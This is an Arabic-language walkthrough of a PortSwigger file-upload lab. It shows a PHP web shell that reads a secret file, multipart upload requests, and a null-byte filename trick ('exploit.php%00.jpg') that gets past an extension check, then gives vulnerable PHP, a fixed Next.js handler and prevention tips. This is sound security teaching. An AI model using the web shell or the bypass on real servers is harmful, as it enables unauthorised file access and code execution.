# Lab: Web shell upload via obfuscated file extension

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) باستخدام **Null Byte Injection** (`%00`) لتجاوز قيود الامتداد. الخادم يسمح فقط بـ `.jpg` و `.png`، لكننا نستخدم `filename="exploit.php%00.jpg"` ليجتاز التحقق (لأنه ينتهي بـ `.jpg`) ثم يتم قطع المسار عند `%00` ويصبح الملف `exploit.php`.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم القيود

- سجل الدخول بـ `wiener:peter`
- حاول رفع ملف `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**النتيجة:** يتم رفض الرفع (يسمح فقط بـ JPG و PNG)

### الخطوة 2: اعتراض طلب رفع الملف

- في Burp → **Proxy > HTTP history**
- ابحث عن طلب `POST /my-account/avatar`
- أرسله إلى **Repeater**

الطلب الأصلي:

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

### الخطوة 3: إضافة Null Byte إلى اسم الملف

- غيّر `filename="exploit.php"` إلى:

```
filename="exploit.php%00.jpg"
```

**الطلب المعدل:**

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

### الخطوة 4: إرسال الطلب

- اضغط **Send**

**النتيجة:** رسالة: "The file exploit.php has been uploaded" ✅

(تم تجاهل `%00.jpg`، والملف خُزن باسم `exploit.php`)

### الخطوة 5: تنفيذ Web Shell

- في Repeater آخر، أرسل طلب `GET` إلى:

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**النتيجة:** يظهر السر (secret) في الرد ✅

### الخطوة 6: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 7: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Null Byte (`%00`)?** | حرف خاص يعني نهاية السلسلة في بعض اللغات (مثل C, PHP القديم) |
| **كيف يعمل التجاوز؟** | الخادم يتحقق من الامتداد (`%00.jpg` → ينتهي بـ `.jpg`)، ثم عند القراءة يتوقف عند `%00` |
| **ما هو تأثير `%00`؟** | يقطع السلسلة: `exploit.php%00.jpg` يصبح `exploit.php` |
| **متى يصلح هذا؟** | في اللغات والبيئات القديمة (PHP قبل 5.3، أنظمة C-based) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

استخدام دوال تقطع السلسلة عند Null Byte (مثل C-style strings) في بيئة PHP قديمة أو لغة خلفية قديمة.

---

### ❌ Non-Compliant Code (PHP - قديم)

```php
<?php
// upload.php - نسخة PHP قديمة (قبل 5.3)
$filename = $_FILES['avatar']['name']; // "exploit.php%00.jpg"

// التحقق من الامتداد
$extension = pathinfo($filename, PATHINFO_EXTENSION); // "jpg" ✅

if ($extension !== 'jpg' && $extension !== 'png') {
    die('Only JPG and PNG are allowed');
}

// خطأ: عند حفظ الملف، Null Byte يقطع السلسلة
// "exploit.php%00.jpg" يصبح "exploit.php"
move_uploaded_file($_FILES['avatar']['tmp_name'], "uploads/{$filename}");
// الملف يخزن باسم "exploit.php"
?>
```

---

### ✅ Compliant Code (Next.js - آمن)

```javascript
// pages/api/upload.js
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import { v4 as uuidv4 } from 'uuid';

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, (err, fields, files) => {
    const file = files.avatar;
    let filename = file.originalFilename;
    
    // التصحيح 1: إزالة Null Byte وأي أحرف خاصة
    filename = filename.replace(/\0/g, '');
    
    // التصحيح 2: استخدام whitelist للامتدادات
    const extension = path.extname(filename).toLowerCase();
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
    
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }
    
    // التصحيح 3: تجاهل اسم المستخدم تماماً
    const safeFilename = `${uuidv4()}${extension}`;
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, safeFilename);
    
    // التصحيح 4: التأكد من أن المسار آمن
    if (!targetPath.startsWith(uploadDir)) {
      return res.status(400).json({ error: 'Invalid path' });
    }
    
    fs.copyFileSync(file.filepath, targetPath);
    res.json({ success: true, filename: safeFilename });
  });
}
```

**الخلاصة:** 
1. أزل Null Bytes وأي أحرف خاصة من أسماء الملفات
2. استخدم القائمة البيضاء (whitelist) للامتدادات
3. أعد تسمية الملفات بأسماء عشوائية
4. ترقية البيئة إلى نسخة حديثة (PHP 5.3+ تحمي من Null Byte)

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **إزالة Null Bytes** | استخدم `.replace(/\0/g, '')` |
| **القائمة البيضاء** | سمح فقط بالامتدادات الآمنة |
| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) |
| **ترقية البيئة** | استخدم إصدارات حديثة من اللغات |
| **فحص نوع الملف** | استخدم مكتبات فحص المحتوى (magic bytes) |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
- [Null Byte Injection](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#null-byte-injection)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)
